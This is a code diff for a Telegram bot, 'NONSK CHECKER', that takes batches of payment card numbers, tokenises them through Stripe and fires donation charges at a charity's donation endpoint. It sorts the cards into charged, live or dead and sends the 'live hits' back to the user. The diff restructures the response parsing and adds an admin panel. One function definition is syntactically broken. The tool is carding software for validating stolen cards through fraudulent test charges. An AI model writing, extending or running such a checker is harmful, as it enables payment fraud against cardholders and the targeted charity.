@@ -20,6 +20,9 @@ results = {
     "live_cards": [],
 }
 
+# Admin ID (replace with your actual admin ID)
+ADMIN_ID = 5429071679  # Replace with your actual admin ID
+
 
 def check_card_details(card):
     try:
@@ -46,7 +49,12 @@ def check_card_details(card):
         result_1 = response_1.json()
 
         if response_1.status_code != 200 or "error" in result_1:
-            return f"DEAD\nMessage: {result_1.get('error', {}).get('message', 'Unknown error')}"
+            return {
+                "status": "DEAD",
+                "message": result_1.get('error', {}).get('message', 'Unknown error'),
+                "decline_code": result_1.get('error', {}).get('code', 'unknown_error'),
+                "gateway": "Stripe [Oneummah]"
+            }
 
         token_id = result_1.get("id", "")
         brand = result_1.get("card", {}).get("brand", "Unknown")
@@ -63,48 +71,39 @@ def check_card_details(card):
         }
 
         response_2 = requests.post(donation_url, headers=headers_2, data=data_2)
-        result_2 = response_2.text
+        result_2 = response_2.json()
 
-        if "payment_intent_unexpected_state" in result_2:
-            return "Payment Intent Confirmed✅"
-        elif "succeeded" in result_2:
-            return "CHARGED✅"
-        elif "Your card has insufficient funds." in result_2:
-            return "INSUFFICIENT FUNDS❎"
-        elif "incorrect_zip" in result_2:
-            return "CVV LIVE❎"
-        elif "insufficient_funds" in result_2:
-            return "INSUFFICIENT FUNDS❎"
-        elif "security code is incorrect" in result_2:
-            return "CCN LIVE❎"
-        elif "Your card's security code is invalid." in result_2:
-            return "CCN LIVE❎"
-        elif "transaction_not_allowed" in result_2:
-            return "CVV LIVE❎"
-        elif "stripe_3ds2_fingerprint" in result_2:
-            return "3D REQUIRED❎"
-        elif "redirect_url" in result_2:
-            return "Approved❎\n3DS Required"
-        elif '"cvc_check": "pass"' in result_2:
-            return "CHARGED✅"
-        elif "Membership Confirmation" in result_2:
-            return "Membership Confirmation✅"
-        elif "Thank you for your support!" in result_2:
-            return "CHARGED✅"
-        elif "Thank you for your donation" in result_2:
-            return "CHARGED✅"
-        elif "incorrect_number" in result_1:
-            return "Your card number is incorrect.❌"
-        elif '"status":"incomplete"' in result_2:
-            return "Your card was declined.❌"
-        elif "Your card was declined." in result_2:
-            return "Your card was declined.❌"
-        elif "card_declined" in result_2:
-            return "Your card was declined.❌"
-        else:
-            return "DEAD❌"
+        if result_2.get("res") is False:
+            return {
+                "status": "DEAD",
+                "message": result_2.get('message', 'Unknown error'),
+                "decline_code": result_2.get('error', {}).get('error', {}).get('decline_code', 'unknown_decline'),
+                "gateway": "Stripe [Oneummah]"
+            }
+
+        # Handle successful responses
+        if "succeeded" in result_2.get("message", ""):
+            return {
+                "status": "CHARGED",
+                "message": "Payment succeeded.",
+                "decline_code": "",
+                "gateway": "Stripe [Oneummah]"
+            }
+
+        return {
+            "status": "UNKNOWN",
+            "message": "Unknown response.",
+            "decline_code": "",
+            "gateway": "Stripe [Oneummah]"
+        }
+
     except Exception as e:
-        return f"An error occurred: {str(e)}"
+        return {
+            "status": "ERROR",
+            "message": str(e),
+            "decline_code": "",
+            "gateway": "Stripe [Oneummah]"
+        }
 
 
 @bot.on_message(filters.command("start"))
@@ -121,7 +120,7 @@ async def start_command(client, message: Message):
 async def check_cards(client, message: Message):
     global results
     results = {
-        "total": 0,
+        "total": 0 ,
         "cvv": 0,
         "ccn": 0,
         "approved": 0,
@@ -146,20 +145,23 @@ async def check_cards(client, message: Message):
         card = card.strip()
         status = check_card_details(card)
 
-        if "✅" in status:
+        if status["status"] == "CHARGED":
             results["cvv"] += 1
             results["live_cards"].append(card)
-        elif "❎" in status:
-            results["ccn"] += 1
-        else:
+        elif status["status"] == "DEAD":
             results["dead"] += 1
+        else:
+            results["ccn"] += 1
 
         await msg.edit_text(
             f"↯ **NONSK CHECKER**\n\n"
             f"**CC:** {card}\n"
-            f"**Status:** {status}\n"
-            f"\n**Checking Info**\n"
-            f"------------------\n"
+            f"**Gateway:** {status['gateway']}\n"
+            f"**Status:** {status['status']} ❌\n"
+            f"**Message:** {status['message']}\n"
+            f"**Reason:** {status['decline_code']}\n\n"
+            f"**Checking Info**\n"
+            f"________________________\n"
             f"**Total:** {results['total']}\n"
             f"**Checked:** {index}\n"
             f"**Live:** {results['cvv']}\n"
@@ -205,6 +207,49 @@ async def send_hits(client, callback_query):
         await callback_query.message.reply_text(f"**Live Hits:**\n\n{hits}")
     else:
         await callback_query.answer("No live hits to send!", show_alert=True)
+
+
+@bot.on_message(filters.command("admin") & filters.user(ADMIN_ID))
+async def admin_interface(client, message: Message):
+    await message.reply_text(
+        "**Admin Interface**\n\n"
+        "Use the following commands to manage the bot:\n"
+        "/stats - View current statistics\n"
+        "/reset - Reset the bot's data",
+        reply_markup=InlineKeyboardMarkup(
+            [
+                [InlineKeyboardButton("View Stats", callback_data="view_stats")],
+                [InlineKeyboardButton("Reset Data", callback_data="reset_data")]
+            ]
+        )
+    )
+
+
+@bot.on_callback_query(filters.regex("view_stats"))
+async def view_stats(client, callback_query):
+    await callback_query.answer()
+    stats_message = (
+        f"**Current Statistics**\n"
+        f"Total Cards Checked: {results['total']}\n"
+        f"Live Cards: {results['cvv']}\n"
+        f"Dead Cards: {results['dead']}\n"
+        f"CCN Issues: {results['ccn']}\n"
+    )
+    await callback_query.message.reply_text(stats_message)
+
+
+@bot.on_callback_query(filters.regex("reset_data"))
+async def reset_data(client, callback_query await callback_query.answer()
+    global results
+    results = {
+        "total": 0,
+        "cvv": 0,
+        "ccn": 0,
+        "approved": 0,
+        "dead": 0,
+        "live_cards": [],
+    }
+    await callback_query.message.reply_text("✅ Data has been reset successfully!")
 
 
 if __name__ == "__main__":
